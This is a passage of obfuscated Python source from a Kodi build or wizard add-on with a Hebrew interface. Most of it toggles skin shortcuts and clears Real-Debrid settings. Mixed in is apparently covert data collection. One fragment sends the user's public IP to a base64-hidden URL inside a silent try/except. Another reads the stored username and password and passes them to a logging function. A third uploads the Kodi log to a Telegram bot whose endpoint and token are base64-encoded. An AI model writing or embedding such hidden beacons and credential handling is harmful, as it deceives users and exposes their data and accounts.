          OO000O00OO0O0000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:575
          O00OO00O00000O000 =str (json .loads (OO000O00OO0O0000O )['ip'])#line:576
          OOOOOO0O0OOOO00O0 =OO000OO00O00000OO #line:577
          O00000000OO00O00O =OO00OOOO0O000OOO0 #line:578
          import socket #line:580
          OO000O00OO0O0000O =urllib2 .urlopen (OO00OOOO0OOO00OO0 .decode ('base64')+' - '+OOOOOO0O0OOOO00O0 +' - '+O00000000OO00O00O +' - '+O00O0O00O000O0O0O ).readlines ()#line:581
       except :pass #line:582
def googleindicat ():#line:585
			import logg #line:586
			O0O000O00OOOOO0O0 =(ADDON .getSetting ("pass"))#line:587
			OOO0OOOOO0OOO0OO0 =(ADDON .getSetting ("user"))#line:588
			logg .logGA (O0O000O00OOOOO0O0 ,OOO0OOOOO0OOO0OO0 )#line:589
def logsend ():#line:590
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:591
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:592
      howsentlog ()#line:594
      import requests #line:595
      if xbmc .getCondVisibility ('system.platform.windows'):#line:596
         O00O0O000OO00OOOO =xbmc .translatePath ('special://home/kodi.log')#line:597
         OO00000OO0000O0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O0O000OO00OOOO ,open (O00O0O000OO00OOOO ,'rb')),}#line:601
         O0000OOOOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:602
         O0OOO0O00O00OO0OO =requests .post (O0000OOOOO000O00O .decode ('base64'),files =OO00000OO0000O0O0 )#line:604
      elif xbmc .getCondVisibility ('system.platform.android'):#line:605
           O00O0O000OO00OOOO =xbmc .translatePath ('special://temp/kodi.log')#line:606
           OO00000OO0000O0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O0O000OO00OOOO ,open (O00O0O000OO00OOOO ,'rb')),}#line:610
           O0000OOOOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:611
           O0OOO0O00O00OO0OO =requests .post (O0000OOOOO000O00O .decode ('base64'),files =OO00000OO0000O0O0 )#line:613
      else :#line:614
           O00O0O000OO00OOOO =xbmc .translatePath ('special://kodi.log')#line:615
           OO00000OO0000O0O0 ={'chat_id':(None ,'-274262389'),'document':(O00O0O000OO00OOOO ,open (O00O0O000OO00OOOO ,'rb')),}#line:619
           O0000OOOOO000O00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:620
           O0OOO0O00O00OO0OO =requests .post (O0000OOOOO000O00O .decode ('base64'),files =OO00000OO0000O0O0 )#line:622
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:623
def rdoff ():#line:625
	OOOO000OOOO0OOOO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:626
	OOOO000OOOO0OOOO0 .setSetting ('rd.client_id','')#line:627
	OOOO000OOOO0OOOO0 .setSetting ('rd.secret','')#line:628
	OOOO000OOOO0OOOO0 .setSetting ('rdsource','false')#line:629
	OOOO000OOOO0OOOO0 .setSetting ('super_fast_type_toren','false')#line:630
	OOOO000OOOO0OOOO0 .setSetting ('rd.auth','false')#line:631
	OOOO000OOOO0OOOO0 .setSetting ('rd.refresh','false')#line:632
	OOOO000OOOO0OOOO0 .setSetting ('magnet','false')#line:633
	OOOO000OOOO0OOOO0 .setSetting ('torrent_server','false')#line:634
	OOOO000OOOO0OOOO0 =xbmcaddon .Addon ('script.module.resolveurl')#line:636
	OOOO000OOOO0OOOO0 .setSetting ('RealDebridResolver_client_id','')#line:637
	OOOO000OOOO0OOOO0 .setSetting ('RealDebridResolver_client_secret','')#line:638
	OOOO000OOOO0OOOO0 .setSetting ('RealDebridResolver_token','')#line:639
	OOOO000OOOO0OOOO0 .setSetting ('RealDebridResolver_refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		OOOO000OOOO0OOOO0 =xbmcaddon .Addon ('plugin.video.seren')#line:642
		OOOO000OOOO0OOOO0 .setSetting ('rd.client_id','')#line:644
		OOOO000OOOO0OOOO0 .setSetting ('rd.secret','')#line:645
		OOOO000OOOO0OOOO0 .setSetting ('rd.auth','')#line:646
		OOOO000OOOO0OOOO0 .setSetting ('rd.refresh','')#line:647
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:648
		OOOO000OOOO0OOOO0 =xbmcaddon .Addon ('plugin.video.gaia')#line:649
		OOOO000OOOO0OOOO0 .setSetting ('accounts.debrid.realdebrid.id','')#line:650
		OOOO000OOOO0OOOO0 .setSetting ('accounts.debrid.realdebrid.secret','')#line:651
		OOOO000OOOO0OOOO0 .setSetting ('accounts.debrid.realdebrid.token','')#line:652
		OOOO000OOOO0OOOO0 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:653
	resloginit .resloginit ('restore','all')#line:654
	O0O0O000OOOOO0OOO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:656
	O00O0O0000000OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:657
	copyfile (O0O0O000OOOOO0OOO ,O00O0O0000000OOO0 )#line:658
def skindialogsettind18 ():#line:659
	try :#line:660
		OO000OO0OOO000OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:661
		O0000000000O0OOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:662
		copyfile (OO000OO0OOO000OOO ,O0000000000O0OOO0 )#line:663
	except :pass #line:664
def rdon ():#line:665
	loginit .loginIt ('restore','all')#line:666
	O0OOOOOOOO00OOO00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:668
	O0OOO0000OO0OOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:669
	copyfile (O0OOOOOOOO00OOO00 ,O0OOO0000OO0OOOOO )#line:670
def adults18 ():#line:672
  OOO0OOO000OOOO0O0 =(ADDON .getSetting ("adults"))#line:673
  if OOO0OOO000OOOO0O0 =='true':#line:674
    O0O000O0000OO00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:675
    with open (O0O000O0000OO00O0 ,'r')as OO00O0O0O0OOO000O :#line:676
      OOO0OO0O0O00000OO =OO00O0O0O0OOO000O .read ()#line:677
    OOO0OO0O0O00000OO =OOO0OO0O0O00000OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:695
    with open (O0O000O0000OO00O0 ,'w')as OO00O0O0O0OOO000O :#line:698
      OO00O0O0O0OOO000O .write (OOO0OO0O0O00000OO )#line:699
def rdbuildaddon ():#line:700
  O000000OO000OO0O0 =(ADDON .getSetting ("auto_rd"))#line:701
  if O000000OO000OO0O0 =='true':#line:702
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:703
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:704
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:705
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:723
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:726
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:727
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:731
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:732
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:733
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:751
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:754
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:755
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:759
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:760
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:761
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:779
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:782
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:783
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:787
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:788
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:789
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:807
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:810
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:811
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:814
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:815
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:816
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:834
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:837
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:838
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:840
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:841
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:842
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:860
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:863
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:864
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:866
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:867
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:868
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:886
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:889
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:890
    O0O00O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (O0O00O00O0OOO00OO ,'r')as O00O00O0OOOOO0000 :#line:894
      OO00O0OO0000O0OOO =O00O00O0OOOOO0000 .read ()#line:895
    OO00O0OO0000O0OOO =OO00O0OO0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:913
    with open (O0O00O00O0OOO00OO ,'w')as O00O00O0OOOOO0000 :#line:916
      O00O00O0OOOOO0000 .write (OO00O0OO0000O0OOO )#line:917
def rdbuildinstall ():#line:920
  try :#line:921
   O0O0OO00O0OO00000 =(ADDON .getSetting ("auto_rd"))#line:922
   if O0O0OO00O0OO00000 =='true':#line:923
     O0O0O0OOO0OOOO00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     O00OOO00O000O00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (O0O0O0OOO0OOOO00O ,O00OOO00O000O00OO )#line:926
  except :#line:927
     pass #line:928
def rdbuildaddonoff ():#line:931
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:934
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:935
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:936
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:954
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:957
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:958
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:962
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:963
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:964
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:982
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:985
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:986
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:990
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:991
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:992
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1010
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1013
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1014
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1018
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:1019
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:1020
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1038
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1041
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1042
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1045
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:1046
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:1047
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1065
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1068
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1069
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1071
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:1072
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:1073
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1091
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1094
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1095
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1097
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:1098
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:1099
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1117
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1120
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1121
    OO0OOO000OO0OOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1124
    with open (OO0OOO000OO0OOOO0 ,'r')as O00OOO0000O000O0O :#line:1125
      OOOO0OOO0O0OO0OOO =O00OOO0000O000O0O .read ()#line:1126
    OOOO0OOO0O0OO0OOO =OOOO0OOO0O0OO0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1144
    with open (OO0OOO000OO0OOOO0 ,'w')as O00OOO0000O000O0O :#line:1147
      O00OOO0000O000O0O .write (OOOO0OOO0O0OO0OOO )#line:1148
def rdbuildinstalloff ():#line:1151
    try :#line:1152
       O00OO0O00OOOOO0O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1153
       OOO00OOO000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (O00OO0O00OOOOO0O0 ,OOO00OOO000OOOOOO )#line:1156
       O00OO0O00OOOOO0O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1158
       OOO00OOO000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (O00OO0O00OOOOO0O0 ,OOO00OOO000OOOOOO )#line:1161
       O00OO0O00OOOOO0O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1163
       OOO00OOO000OOOOOO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
       copyfile (O00OO0O00OOOOO0O0 ,OOO00OOO000OOOOOO )#line:1166
       O00OO0O00OOOOO0O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1169
       OOO00OOO000OOOOOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
